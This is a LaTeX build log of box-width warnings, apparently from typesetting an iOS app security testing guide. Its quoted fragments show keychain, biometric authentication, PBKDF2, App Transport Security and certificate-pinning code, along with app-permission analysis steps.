[]\TU/SourceCodePro(6)/m/n/10.95 [+]   /private/var/mobile/Containers/Data/Appl
ication/APP_ID/Library/Caches/Snapshots/app_name/B75DD942-76D1-4B86-8466-B79F7A
78B437@2x.png[] 
[649]
Overfull \hbox (502.88927pt too wide) in paragraph at lines 36999--36999
[]\TU/SourceCodePro(6)/m/n/10.95 [+]   /private/var/mobile/Containers/Data/Appl
ication/APP_ID/Library/Caches/Snapshots/app_name/downscaled/12B93BCB-610B-44DA-
A171-AF205BA71269@2x.png[] 
[650]
Overfull \hbox (32.03958pt too wide) in paragraph at lines 37088--37088
[]\TU/SourceCodePro(6)/m/n/10.95 var str1 = "Goodbye"              // "Goodbye"
, base address:            0x0001039e8dd0[] 

Overfull \hbox (27.65958pt too wide) in paragraph at lines 37088--37088
[]\TU/SourceCodePro(6)/m/n/10.95 str1.append(" ")                 // "Goodbye "
, base address:            0x608000064ae0[] 

Overfull \hbox (73.64944pt too wide) in paragraph at lines 37088--37088
[]\TU/SourceCodePro(6)/m/n/10.95 str1.append("cruel world!")      // "Goodbye c
ruel world", base address: 0x6080000338a0[] 

Overfull \hbox (7.94965pt too wide) in paragraph at lines 37088--37088
[]\TU/SourceCodePro(6)/m/n/10.95 str1.removeAll()                 // "", base a
ddress                    0x00010bd66180[] 
[651] [652]
Underfull \hbox (badness 1354) in paragraph at lines 37222--37229
\TU/SourceSansPro(0)/m/n/10.95 (and any other r2frida specific commands) with a
 backslash \TU/SourceCodePro(6)/m/n/10.95 \ \TU/SourceSansPro(0)/m/n/10.95 afte
r starting the session with \TU/SourceCodePro(6)/m/n/10.95 r2
[653]
Underfull \hbox (badness 10000) in paragraph at lines 37297--37300
\TU/SourceSansPro(0)/m/n/10.95 sor - [][]$[][][][][] [] [] [] [][][] [] [][][][
][][][][] [] [][][] [] [][][][] [] [][] [][] [][] [] [][][][][][][][][] [] [][]
 [][] [][] [][] [][][][][] [][] [][][][][][][][][][][][] [][] [][][] [][] [][][
][][][] [][]
[654]
Underfull \hbox (badness 3792) in paragraph at lines 37346--37348
[]\TU/SourceSansPro(0)/m/it/10.95 Symmetric-Key \TU/SourceSansPro(0)/m/n/10.95 
- Message Authentication Codes (HMAC) - Authenticated Encryption - AES-GCM -
[655] [656] [657]
Underfull \hbox (badness 5374) in paragraph at lines 37525--37534
[]\TU/SourceSansPro(0)/m/n/10.95 A lot has been said about deprecated algorithm
s and cryptographic configurations in section
[658]
Overfull \hbox (84.5994pt too wide) in paragraph at lines 37674--37674
[]\TU/SourceCodePro(6)/m/n/10.95 func pbkdf2SHA1(password: String, salt: Data, 
keyByteCount: Int, rounds: Int) -> Data? {[] 

Overfull \hbox (393.38934pt too wide) in paragraph at lines 37674--37674
[]    \TU/SourceCodePro(6)/m/n/10.95 return pbkdf2(hash: CCPBKDFAlgorithm(kCCPR
FHmacAlgSHA1), password: password, salt: salt, keyByteCount: keyByteCount, roun
ds: rounds)[] 

Overfull \hbox (97.73938pt too wide) in paragraph at lines 37674--37674
[]\TU/SourceCodePro(6)/m/n/10.95 func pbkdf2SHA256(password: String, salt: Data
, keyByteCount: Int, rounds: Int) -> Data? {[] 

Overfull \hbox (406.52934pt too wide) in paragraph at lines 37674--37674
[]    \TU/SourceCodePro(6)/m/n/10.95 return pbkdf2(hash: CCPBKDFAlgorithm(kCCPR
FHmacAlgSHA256), password: password, salt: salt, keyByteCount: keyByteCount, ro
unds: rounds)[] 

Overfull \hbox (97.73938pt too wide) in paragraph at lines 37674--37674
[]\TU/SourceCodePro(6)/m/n/10.95 func pbkdf2SHA512(password: String, salt: Data
, keyByteCount: Int, rounds: Int) -> Data? {[] 

Overfull \hbox (406.52934pt too wide) in paragraph at lines 37674--37674
[]    \TU/SourceCodePro(6)/m/n/10.95 return pbkdf2(hash: CCPBKDFAlgorithm(kCCPR
FHmacAlgSHA512), password: password, salt: salt, keyByteCount: keyByteCount, ro
unds: rounds)[] 

Overfull \hbox (211.61938pt too wide) in paragraph at lines 37674--37674
[]\TU/SourceCodePro(6)/m/n/10.95 func pbkdf2(hash: CCPBKDFAlgorithm, password: 
String, salt: Data, keyByteCount: Int, rounds: Int) -> Data? {[] 

Overfull \hbox (67.07942pt too wide) in paragraph at lines 37674--37674
[]    \TU/SourceCodePro(6)/m/n/10.95 let derivationStatus = derivedKeyData.with
UnsafeMutableBytes { derivedKeyBytes in[] 
[659]
Overfull \hbox (202.85939pt too wide) in paragraph at lines 37674--37674
[]    \TU/SourceCodePro(6)/m/n/10.95 let derivedKey = pbkdf2SHA1(password: pass
word, salt: salt, keyByteCount: keyByteCount, rounds: rounds)[] 
[660] [661] [662]
Underfull \hbox (badness 3724) in paragraph at lines 37869--37872
[]\TU/SourceSansPro(0)/m/n/10.95 Apple Developer Documentation on Security - []
[]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][] [] [][][] [] [][][][][]
[][][][][][][][] []

Overfull \hbox (14.51588pt too wide) in paragraph at lines 37883--37886
[]\TU/SourceSansPro(0)/m/n/10.95 Apple’s Cryptographic Services Guide - [][]$[]
[][][][] [] [] [] [][][][][][][][][] [] [][][][][] [] [][][] [] [][][][][][][] 
[] [][][][][][][] [] [][][][][][][][][][][][][] []

Underfull \hbox (badness 3078) in paragraph at lines 37886--37889
[]\TU/SourceSansPro(0)/m/n/10.95 Apple Developer Documentation on randomization
 SecKey - [][]$[][][][][] [] [] [] [][][][][][][][][][] [] [][][][][] [] [][][]
 []

Underfull \hbox (badness 10000) in paragraph at lines 37892--37895
[]\TU/SourceSansPro(0)/m/n/10.95 Source code of the header file - [][]$[][][][]
[] [] [] [] [][][][][][][][][][] [] [][][][][] [] [][][] [] [][][][][][] [] [][
][][][][][][][][][][] []

Overfull \hbox (0.48085pt too wide) in paragraph at lines 37895--37898
[]\TU/SourceSansPro(0)/m/n/10.95 GCM in CommonCrypto - [][]$[][][][][] [] [] []
 [][][][][][][][][][] [] [][][][][] [] [][][] [] [][][][][][] [] [][][][][][][]
[][][][][] [] [][][][][][][][][][][][] [][]

Underfull \hbox (badness 1803) in paragraph at lines 37898--37901
[]\TU/SourceSansPro(0)/m/n/10.95 Apple Developer Documentation on SecKey - [][]
$[][][][][] [] [] [] [][][][][][][][][][] [] [][][][][] [] [][][] [] [][][][][]
[] [] [][][][][][][][] []
[663]
Underfull \hbox (badness 10000) in paragraph at lines 37923--37926
[]\TU/SourceSansPro(0)/m/n/10.95 Google on Tink - [][]$[][][][][] [] [] [] [][]
[][][][][][] [] [][][][][][][][][][] [] [][][] [] [][][][] [] [][] [] [][][][][
][][][][][][] [][] [][][][] [][] [][][][][][][][][][][][][] [][]

Underfull \hbox (badness 10000) in paragraph at lines 37928--37931
[]\TU/SourceSansPro(0)/m/n/10.95 cartfile - [][]$[][][][][] [] [] [] [][][][][]
[] [] [][][] [] [][][][][][][][] [] [][][][][][][][] [] [][][][] [] [][][][][][
] [] [][][][][][][][][][][][][] [] [][][][][][][][][] [] [][] []

Overfull \hbox (3.03296pt too wide) in paragraph at lines 37941--37944
[]\TU/SourceSansPro(0)/m/n/10.95 Apple Developer Documentation on randomization
 - [][]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][] [] [][][] [] [][][
][][][][][][][][][][] []

Underfull \hbox (badness 10000) in paragraph at lines 37944--37947
[]\TU/SourceSansPro(0)/m/n/10.95 Apple Developer Documentation on secrandomcopy
bytes - [][]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][] [] [][][] []

Underfull \hbox (badness 10000) in paragraph at lines 37957--37960
[]\TU/SourceSansPro(0)/m/n/10.95 Apple Developer Documentation: Certificates an
d keys - [][]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][] [] [][][] []


Underfull \hbox (badness 10000) in paragraph at lines 37960--37963
[]\TU/SourceSansPro(0)/m/n/10.95 Apple Developer Documentation: Generating new 
keys - [][]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][] [] [][][] []

Overfull \hbox (9.98613pt too wide) in paragraph at lines 37960--37963
[][][][][][][][][][][][][] [] [][][][][][][][] [] [][][][][][][][][][][] [] [][
][] [] [][][] [] [][][][][] [] [][][][][][][][] [] [][][][] [] [][][][][][][][]
[][] [] [][][] [] [][][][][][][][][][][][][] []

Underfull \hbox (badness 3884) in paragraph at lines 37963--37965
[]\TU/SourceSansPro(0)/m/n/10.95 Apple Developer Documentation: Key generation 
attributes - [][]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][] [] [][][
] []
[664]
Underfull \hbox (badness 4013) in paragraph at lines 38021--38032
[]\TU/SourceCodePro(6)/m/n/10.95 Security.framework \TU/SourceSansPro(0)/m/n/10
.95 is a lower level API to access [][]keychain services[][]. This is a se-

Underfull \hbox (badness 2644) in paragraph at lines 38021--38032
\TU/SourceSansPro(0)/m/n/10.95 cure option if your app needs to protect some se
cret data with biometric authentication,

Underfull \hbox (badness 4518) in paragraph at lines 38021--38032
\TU/SourceSansPro(0)/m/n/10.95 since the access control is managed on a system-
level and can not easily be bypassed.

Overfull \hbox (34.8901pt too wide) in paragraph at lines 38034--38040
[]\TU/SourceSansPro(0)/m/n/10.95 Please be aware that using either the \TU/Sour
ceCodePro(6)/m/n/10.95 LocalAuthentication.framework \TU/SourceSansPro(0)/m/n/1
0.95 or the \TU/SourceCodePro(6)/m/n/10.95 Security.framework\TU/SourceSansPro(
0)/m/n/10.95 ,
[665]
Overfull \hbox (29.56102pt too wide) in paragraph at lines 38054--38060
[]\TU/SourceCodePro(6)/m/n/10.95 deviceOwnerAuthentication\TU/SourceSansPro(0)/
m/n/10.95 (Swift) or \TU/SourceCodePro(6)/m/n/10.95 LAPolicyDeviceOwnerAuthenti
cation\TU/SourceSansPro(0)/m/n/10.95 (Objective-

Overfull \hbox (214.98097pt too wide) in paragraph at lines 38060--38064
[]\TU/SourceCodePro(6)/m/n/10.95 deviceOwnerAuthenticationWithBiometrics \TU/So
urceSansPro(0)/m/n/10.95 (Swift) or \TU/SourceCodePro(6)/m/n/10.95 LAPolicyDevi
ceOwnerAuthenticationWithBiometrics\TU/SourceSansPro(0)/m/n/10.95 (Objective-

Overfull \hbox (51.74937pt too wide) in paragraph at lines 38090--38090
[]\TU/SourceCodePro(6)/m/n/10.95 guard context.canEvaluatePolicy(.deviceOwnerAu
thentication, error: &error) else {[] 

Overfull \hbox (82.40948pt too wide) in paragraph at lines 38090--38090
[]    \TU/SourceCodePro(6)/m/n/10.95 // Could not evaluate policy; look at erro
r and present an appropriate message to user[] 

Overfull \hbox (463.46931pt too wide) in paragraph at lines 38090--38090
[]\TU/SourceCodePro(6)/m/n/10.95 context.evaluatePolicy(.deviceOwnerAuthenticat
ion, localizedReason: "Please, pass authorization to enter this area") { succes
s, evaluationError in[] 

Overfull \hbox (156.86946pt too wide) in paragraph at lines 38090--38090
[]        \TU/SourceCodePro(6)/m/n/10.95 // User did not authenticate successfu
lly, look at evaluationError and take appropriate action[] 
[666]
Overfull \hbox (126.31892pt too wide) in paragraph at lines 38111--38117
\TU/SourceSansPro(0)/m/n/10.95 be accessed only on the current device while the
 passcode is set (\TU/SourceCodePro(6)/m/n/10.95 kSecAttrAccessibleWhenPasscode
SetThisDeviceOnly

Overfull \hbox (206.75691pt too wide) in paragraph at lines 38111--38117
\TU/SourceSansPro(0)/m/n/10.95 parameter) and after Touch ID authentication for
 the currently enrolled fingers only (\TU/SourceCodePro(6)/m/n/10.95 SecAccessC
ontrolCreateFlags.biometryCurrentSet

Overfull \hbox (16.70944pt too wide) in paragraph at lines 38154--38154
[]\TU/SourceCodePro(6)/m/n/10.95 // 1. create AccessControl object that will re
present authentication settings[] 

Overfull \hbox (34.22939pt too wide) in paragraph at lines 38154--38154
[]\TU/SourceCodePro(6)/m/n/10.95 guard let accessControl = SecAccessControlCrea
teWithFlags(kCFAllocatorDefault,[] 

Overfull \hbox (99.9297pt too wide) in paragraph at lines 38154--38154
[]                                                          \TU/SourceCodePro(6
)/m/n/10.95 kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,[] 

Overfull \hbox (93.3597pt too wide) in paragraph at lines 38154--38154
[]                                                          \TU/SourceCodePro(6
)/m/n/10.95 SecAccessControlCreateFlags.biometryCurrentSet,[] 

Overfull \hbox (378.0594pt too wide) in paragraph at lines 38154--38154
[]\TU/SourceCodePro(6)/m/n/10.95 // 2. define keychain services query. Pay atte
ntion that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible 
attribute[] 

Overfull \hbox (73.64941pt too wide) in paragraph at lines 38154--38154
[]\TU/SourceCodePro(6)/m/n/10.95 query[kSecValueData as String] = "test_strong_
password".data(using: .utf8)! as CFData[] 
[667]
Overfull \hbox (34.22946pt too wide) in paragraph at lines 38185--38185
[]    \TU/SourceCodePro(6)/m/n/10.95 // 1. create AccessControl object that wil
l represent authentication settings[] 

Overfull \hbox (73.6494pt too wide) in paragraph at lines 38185--38185
[]    \TU/SourceCodePro(6)/m/n/10.95 SecAccessControlRef sacRef = SecAccessCont
rolCreateWithFlags(kCFAllocatorDefault,[] 

Overfull \hbox (395.57942pt too wide) in paragraph at lines 38185--38185
[]    \TU/SourceCodePro(6)/m/n/10.95 // 2. define keychain services query. Pay 
attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessi
ble attribute[] 

Overfull \hbox (170.00938pt too wide) in paragraph at lines 38185--38185
[]        \TU/SourceCodePro(6)/m/n/10.95 (__bridge id)kSecValueData: [@"test_st
rong_password" dataUsingEncoding:NSUTF8StringEncoding],[] 
[668]
Overfull \hbox (167.81941pt too wide) in paragraph at lines 38215--38215
[]\TU/SourceCodePro(6)/m/n/10.95 query[kSecUseOperationPrompt as String] = "Ple
ase, pass authorisation to enter this area" as CFString[] 

Overfull \hbox (82.40938pt too wide) in paragraph at lines 38239--38239
[]\TU/SourceCodePro(6)/m/n/10.95 NSDictionary *query = @{(__bridge id)kSecClass
: (__bridge id)kSecClassGenericPassword,[] 

Overfull \hbox (106.49944pt too wide) in paragraph at lines 38239--38239
[]    \TU/SourceCodePro(6)/m/n/10.95 (__bridge id)kSecUseOperationPrompt: @"Ple
ase, pass authorisation to enter this area" };[] 
[669]
Overfull \hbox (78.02939pt too wide) in paragraph at lines 38239--38239
[]\TU/SourceCodePro(6)/m/n/10.95 OSStatus status = SecItemCopyMatching((__bridg
e CFDictionaryRef)query, &queryResult);[] 

Overfull \hbox (152.48938pt too wide) in paragraph at lines 38239--38239
[]    \TU/SourceCodePro(6)/m/n/10.95 NSString* password = [[NSString alloc] ini
tWithData:resultData encoding:NSUTF8StringEncoding];[] 

Overfull \hbox (29.8494pt too wide) in paragraph at lines 38257--38257
[]\TU/SourceCodePro(6)/m/n/10.95 /System/Library/Frameworks/LocalAuthentication
.framework/LocalAuthentication[] 
[670]
Overfull \hbox (110.23622pt too wide) in paragraph at lines 38287--38296
[]\TU/SourceCodePro(6)/m/n/10.95 kSecAccessControlBiometryCurrentSet \TU/Source
SansPro(0)/m/n/10.95 (before iOS 11.3 \TU/SourceCodePro(6)/m/n/10.95 kSecAccess
ControlTouchIDCurrentSet\TU/SourceSansPro(0)/m/n/10.95 ).

Overfull \hbox (18.25624pt too wide) in paragraph at lines 38296--38306
[]\TU/SourceCodePro(6)/m/n/10.95 kSecAccessControlBiometryAny \TU/SourceSansPro
(0)/m/n/10.95 (before iOS 11.3 \TU/SourceCodePro(6)/m/n/10.95 kSecAccessControl
TouchIDAny\TU/SourceSansPro(0)/m/n/10.95 ).

Overfull \hbox (153.38371pt too wide) in paragraph at lines 38315--38321
[]\TU/SourceSansPro(0)/m/n/10.95 In order to make sure that biometrics can be u
sed, verify that the \TU/SourceCodePro(6)/m/n/10.95 kSecAttrAccessibleWhenPassc
odeSetThisDeviceOnly

Underfull \hbox (badness 10000) in paragraph at lines 38315--38321
\TU/SourceSansPro(0)/m/n/10.95 or the \TU/SourceCodePro(6)/m/n/10.95 kSecAttrAc
cessibleWhenPasscodeSet \TU/SourceSansPro(0)/m/n/10.95 protection class is set 
when the

Overfull \hbox (13.90015pt too wide) in paragraph at lines 38315--38321
\TU/SourceCodePro(6)/m/n/10.95 SecAccessControlCreateWithFlags \TU/SourceSansPr
o(0)/m/n/10.95 method is called. Note that the \TU/SourceCodePro(6)/m/n/10.95 .
..ThisDeviceOnly
[671] [672]
Underfull \hbox (badness 1303) in paragraph at lines 38428--38437
[]\TU/SourceSansPro(0)/m/n/10.95 Most modern mobile apps use variants of HTTP-b
ased web services, as these protocols are well-
[673]
Overfull \hbox (63.0455pt too wide) in paragraph at lines 38545--38548
[]\TU/SourceSansPro(0)/m/n/10.95 ATS restrictions can be disabled by configurin
g exceptions in the Info.plist file under the \TU/SourceCodePro(6)/m/n/10.95 NS
AppTransportSecurity
[674]
Overfull \hbox (865.62978pt too wide) in paragraph at lines 38561--38567
\TU/SourceSansPro(0)/m/n/10.95 ture of the \TU/SourceCodePro(6)/m/n/10.95 [NSAp
pTransportSecurity](https://developer.apple.com/library/content/documentation/G
eneral/Reference/InfoPlistKeyReference/Articles/CocoaKeys.html#//apple_ref/doc/
plist/info/NSAppTransportSecurity

Overfull \hbox (16.7095pt too wide) in paragraph at lines 38584--38584
[]            \TU/SourceCodePro(6)/m/n/10.95 NSExceptionRequiresForwardSecrecy 
: Boolean   // Default value is YES[] 

Overfull \hbox (13.08879pt too wide) in paragraph at lines 38605--38606
[]\TU/SourceCodePro(6)/m/n/10.95 NSAllowsArbitraryLoads|  

Overfull \hbox (91.92879pt too wide) in paragraph at lines 38611--38612
[]\TU/SourceCodePro(6)/m/n/10.95 NSAllowsArbitraryLoadsInWebContent|  

Overfull \hbox (19.6588pt too wide) in paragraph at lines 38617--38618
[]\TU/SourceCodePro(6)/m/n/10.95 NSAllowsLocalNetworking|  

Overfull \hbox (65.64879pt too wide) in paragraph at lines 38622--38623
[]\TU/SourceCodePro(6)/m/n/10.95 NSAllowsArbitraryLoadsForMedia|  
[675]
Overfull \hbox (91.92879pt too wide) in paragraph at lines 38651--38652
[]\TU/SourceCodePro(6)/m/n/10.95 NSExceptionAllowsInsecureHTTPLoads|  

Overfull \hbox (52.50879pt too wide) in paragraph at lines 38657--38658
[]\TU/SourceCodePro(6)/m/n/10.95 NSExceptionMinimumTLSVersion|  

Overfull \hbox (85.35878pt too wide) in paragraph at lines 38662--38663
[]\TU/SourceCodePro(6)/m/n/10.95 NSExceptionRequiresForwardSecrecy|  
[676]
Overfull \hbox (161.24939pt too wide) in paragraph at lines 38767--38767
[]\TU/SourceCodePro(6)/m/n/10.95 Configuring ATS Info.plist keys and displaying
 the result of HTTPS loads to https://www.example.com.[] 

Overfull \hbox (36.41942pt too wide) in paragraph at lines 38767--38767
[]\TU/SourceCodePro(6)/m/n/10.95 A test will "PASS" if URLSession:task:didCompl
eteWithError: returns a nil error.[] 

Overfull \hbox (318.92938pt too wide) in paragraph at lines 38767--38767
[]\TU/SourceCodePro(6)/m/n/10.95 Use []--verbose[] to view the ATS dictionaries
 used and to display the error received in URLSession:task:didCompleteWithError
:.[] 

Overfull \hbox (56.12936pt too wide) in paragraph at lines 38767--38767
[]\TU/SourceCodePro(6)/m/n/10.95 ==============================================
==================================[] 

Overfull \hbox (56.12936pt too wide) in paragraph at lines 38767--38767
[]\TU/SourceCodePro(6)/m/n/10.95 ==============================================
==================================[] 

Overfull \hbox (56.12936pt too wide) in paragraph at lines 38767--38767
[]\TU/SourceCodePro(6)/m/n/10.95 ==============================================
==================================[] 
[677]
Overfull \hbox (327.68933pt too wide) in paragraph at lines 38767--38767
[]\TU/SourceCodePro(6)/m/n/10.95 2019-01-15 09:39:27.892 nscurl[11459:5126999] 
NSURLSession/NSURLConnection HTTP load failed (kCFStreamErrorDomainSSL, -9800)[
] 
[678]
Underfull \hbox (badness 4024) in paragraph at lines 38830--38833
[]\TU/SourceSansPro(0)/m/n/10.95 If the application opens third party web sites
 in web views, then from iOS 10 onwards

Underfull \hbox (badness 3209) in paragraph at lines 38830--38833
\TU/SourceCodePro(6)/m/n/10.95 NSAllowsArbitraryLoadsInWebContent \TU/SourceSan
sPro(0)/m/n/10.95 can be used to disable ATS restrictions for
[679]
Overfull \hbox (82.38867pt too wide) in paragraph at lines 38918--38924
\TU/SourceSansPro(0)/m/n/10.95 and \TU/SourceCodePro(6)/m/n/10.95 connection: f
orAuthenticationChallenge\TU/SourceSansPro(0)/m/n/10.95 . Within \TU/SourceCode
Pro(6)/m/n/10.95 connection: forAuthenticationChallenge\TU/SourceSansPro(0)/m/n
/10.95 ,

Overfull \hbox (378.0593pt too wide) in paragraph at lines 38941--38941
[]\TU/SourceCodePro(6)/m/n/10.95 (void)connection:(NSURLConnection *)connection
 willSendRequestForAuthenticationChallenge:(NSURLAuthenticationChallenge *)chal
lenge[] 

Overfull \hbox (42.9894pt too wide) in paragraph at lines 38941--38941
[]  \TU/SourceCodePro(6)/m/n/10.95 SecCertificateRef certificate = SecTrustGetC
ertificateAtIndex(serverTrust, 0);[] 

Overfull \hbox (104.30937pt too wide) in paragraph at lines 38941--38941
[]  \TU/SourceCodePro(6)/m/n/10.95 NSData *remoteCertificateData = CFBridgingRe
lease(SecCertificateCopyData(certificate));[] 

Overfull \hbox (156.86937pt too wide) in paragraph at lines 38941--38941
[]  \TU/SourceCodePro(6)/m/n/10.95 NSString *cerPath = [[NSBundle mainBundle] p
athForResource:@"MyLocalCertificate" ofType:@"cer"];[] 

Overfull \hbox (233.51941pt too wide) in paragraph at lines 38941--38941
[]  \TU/SourceCodePro(6)/m/n/10.95 The control below can verify if the certific
ate received by the server is matching the one pinned in the client.[] 

Overfull \hbox (49.5594pt too wide) in paragraph at lines 38941--38941
[]  \TU/SourceCodePro(6)/m/n/10.95 NSURLCredential *credential = [NSURLCredenti
al credentialForTrust:serverTrust];[] 

Overfull \hbox (78.02939pt too wide) in paragraph at lines 38941--38941
[]  \TU/SourceCodePro(6)/m/n/10.95 [[challenge sender] useCredential:credential
 forAuthenticationChallenge:challenge];[] 
[680]
Overfull \hbox (56.34846pt too wide) in paragraph at lines 38952--38957
[]\TU/SourceSansPro(0)/m/n/10.95 Implement your own pin based on the public key
: Change the comparison \TU/SourceCodePro(6)/m/n/10.95 if ([remoteCertificateDa
ta
[681] [682]
Underfull \hbox (badness 10000) in paragraph at lines 39161--39163
[][][][][][][][] [][] [][][][][] [][] [][][][][][][][][][][][][][][][][][][][][
][] [][] [][][][][][][][][][][][][][][][][][][][][][] [][] [][][] [][] [][][][]
[][][][][] [][] [][][][][][][][] [][] [][][] [][]
[683] [684] [685]
Overfull \hbox (46.84747pt too wide) in paragraph at lines 39334--39339
[]\TU/SourceSansPro(0)/m/n/10.95 App capabilities like \TU/SourceCodePro(6)/m/n
/10.95 bluetooth-peripheral \TU/SourceSansPro(0)/m/n/10.95 or \TU/SourceCodePro
(6)/m/n/10.95 bluetooth-central \TU/SourceSansPro(0)/m/n/10.95 (both \TU/Source
CodePro(6)/m/n/10.95 UIBackgroundModes\TU/SourceSansPro(0)/m/n/10.95 )

Overfull \hbox (164.22061pt too wide) in paragraph at lines 39341--39346
[]\TU/SourceSansPro(0)/m/n/10.95 However, this is not yet enough for the app to
 get access to the Bluetooth peripheral, the \TU/SourceCodePro(6)/m/n/10.95 NSB
luetoothPeripheralUsageDescription
[686]
Overfull \hbox (53.38101pt too wide) in paragraph at lines 39418--39421
[]\TU/SourceSansPro(0)/m/n/10.95 The provisioning profile is embedded into the 
app bundle during the build (\TU/SourceCodePro(6)/m/n/10.95 embedded.mobileprov
ision\TU/SourceSansPro(0)/m/n/10.95 ). 

Underfull \hbox (badness 1655) in paragraph at lines 39425--39432
[]\TU/SourceSansPro(0)/m/n/10.95 For example, if you want to set the “Default D
ata Protection” capability, you would need to go

Overfull \hbox (2.72989pt too wide) in paragraph at lines 39425--39432
\TU/SourceCodePro(6)/m/n/10.95 <appname>.entitlements \TU/SourceSansPro(0)/m/n/
10.95 file as the \TU/SourceCodePro(6)/m/n/10.95 com.apple.developer.default-da
ta-protection
[687]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/cc898defa915d8d7db3adb3f979afac334c445be.
png" >
Underfull \hbox (badness 3000) in paragraph at lines 39487--39494
[]\TU/SourceSansPro(0)/m/n/10.95 If linking on or after iOS 10, developers are 
required to include purpose strings in their app’s

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/eae05828cb9867b6aee454c942147439062e1a64.
png" > [688]
Underfull \hbox (badness 2573) in paragraph at lines 39576--39588
[]\TU/SourceSansPro(0)/m/n/10.95 Apart from simply checking if the permissions 
make sense, further analysis steps might be de-
[689]
Overfull \hbox (30.53203pt too wide) in paragraph at lines 39646--39651
\TU/SourceSansPro(0)/m/it/10.95 bedded provisioning profile \TU/SourceSansPro(0
)/m/n/10.95 that is usually located in the root app bundle folder (\TU/SourceCo
dePro(6)/m/n/10.95 Payload/<appname>.app/\TU/SourceSansPro(0)/m/n/10.95 )
[690]
Overfull \hbox (0.8587pt too wide) in paragraph at lines 39672--39679
\TU/SourceSansPro(0)/m/n/10.95 able to find \TU/SourceCodePro(6)/m/n/10.95 .ent
itlements \TU/SourceSansPro(0)/m/n/10.95 files. This could be also the case for
 the \TU/SourceCodePro(6)/m/n/10.95 embedded.mobileprovision

Overfull \hbox (56.12888pt too wide) in paragraph at lines 39697--39697
[]\TU/SourceCodePro(6)/m/n/10.95 ----------------------------------------------
----------------------------------[] 

Overfull \hbox (145.91937pt too wide) in paragraph at lines 39714--39714
[]\TU/SourceCodePro(6)/m/n/10.95 0x0015d2a4 ascii <?xml version="1.0" encoding=
"UTF-8" standalone="yes"?>\n<!DOCTYPE plist PUBLIC[] 

Overfull \hbox (191.90932pt too wide) in paragraph at lines 39714--39714
[]\TU/SourceCodePro(6)/m/n/10.95 "-//Apple//DTD PLIST 1.0//EN" "http://www.appl
e.com/DTDs/PropertyList-1.0.dtd">\n<plist version="1.0">[] 

Overfull \hbox (42.9894pt too wide) in paragraph at lines 39714--39714
[]\TU/SourceCodePro(6)/m/n/10.95 0x0016427d ascii H<?xml version="1.0" encoding
="UTF-8"?>\n<!DOCTYPE plist PUBLIC[] 

Overfull \hbox (205.04932pt too wide) in paragraph at lines 39714--39714
[]\TU/SourceCodePro(6)/m/n/10.95 "-//Apple//DTD PLIST 1.0//EN" "http://www.appl
e.com/DTDs/PropertyList-1.0.dtd">\n<plist version="1.0">\n[] 
[691]
Overfull \hbox (187.52934pt too wide) in paragraph at lines 39743--39743
[]\TU/SourceCodePro(6)/m/n/10.95 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.
0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">[] 
[692]
Overfull \hbox (0.28447pt too wide) in paragraph at lines 39807--39807
 []        \TU/SourceCodePro(6)/m/n/10.95 // Location services are available, s
o query the user’s location.[] 

Overfull \hbox (150.18265pt too wide) in paragraph at lines 39838--39841
[]\TU/SourceSansPro(0)/m/n/10.95 Consider the list of permissions / capabilitie
s identified in the static analysis (e.g. \TU/SourceCodePro(6)/m/n/10.95 NSLoca
tionWhenInUseUsageDescription\TU/SourceSansPro(0)/m/n/10.95 ). 
[693]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/e23c83cdb5b3794160113d98a0bccc36eb3be1b6.
png" > [694]
Overfull \hbox (130.58942pt too wide) in paragraph at lines 39905--39905
[] \TU/SourceCodePro(6)/m/n/10.95 11186 ms     |    | +[CLLocationManager _auth
orizationStatusForBundleIdentifier:0x0 bundle:0x0][] 

Overfull \hbox (64.88943pt too wide) in paragraph at lines 39940--39940
[]  \TU/SourceCodePro(6)/m/n/10.95 3630 ms     | -[CLLocationManager initWithEf
fectiveBundleIdentifier:0x0 bundle:0x0][] 

Overfull \hbox (183.14935pt too wide) in paragraph at lines 39940--39940
[]\TU/SourceCodePro(6)/m/n/10.95 0x1031aa158 TelegramUI!+[TGLocationUtils reque
stWhenInUserLocationAuthorizationWithLocationManager:][] 

Overfull \hbox (42.98938pt too wide) in paragraph at lines 39940--39940
[]    \TU/SourceCodePro(6)/m/n/10.95 0x10337e2c0 TelegramUI!-[TGLocationPickerC
ontroller initWithContext:intent:][] 

Overfull \hbox (252.63443pt too wide) in paragraph at lines 39942--39950
\TU/SourceSansPro(0)/m/n/10.95 Status.authorizedWhenInUse[][]) and was called b
y \TU/SourceCodePro(6)/m/n/10.95 +[TGLocationUtils requestWhenInUserLocationAut
horizationWithLocationManager:]\TU/SourceSansPro(0)/m/n/10.95 .
[695]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/0b7f0c46917539212ca389968c59a617a2f79b41.
png" > [696] [697]
Overfull \hbox (198.84799pt too wide) in paragraph at lines 40126--40132
\TU/SourceCodePro(6)/m/n/10.95 https://<domain>/apple-app-site-association \TU/
SourceSansPro(0)/m/n/10.95 or \TU/SourceCodePro(6)/m/n/10.95 https://<domain>/.
well-known/apple-app-site-association\TU/SourceSansPro(0)/m/n/10.95 . 
[698]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/d8998c087e399a85eecdd91878167c02546f33d5.
png" > [699]
Underfull \hbox (badness 4531) in paragraph at lines 40213--40217
[]\TU/SourceSansPro(0)/m/n/10.95 In order to receive links and handle them appr
opriately, the app delegate has to implement

Underfull \hbox (badness 1377) in paragraph at lines 40213--40217
[][]\TU/SourceCodePro(6)/m/n/10.95 application:continueUserActivity:restoration
Handler:[][]\TU/SourceSansPro(0)/m/n/10.95 . If you have the original

Overfull \hbox (20.3754pt too wide) in paragraph at lines 40225--40234
\TU/SourceCodePro(6)/m/n/10.95 NSUserActivity \TU/SourceSansPro(0)/m/n/10.95 ob
ject with an \TU/SourceCodePro(6)/m/n/10.95 activityType \TU/SourceSansPro(0)/m
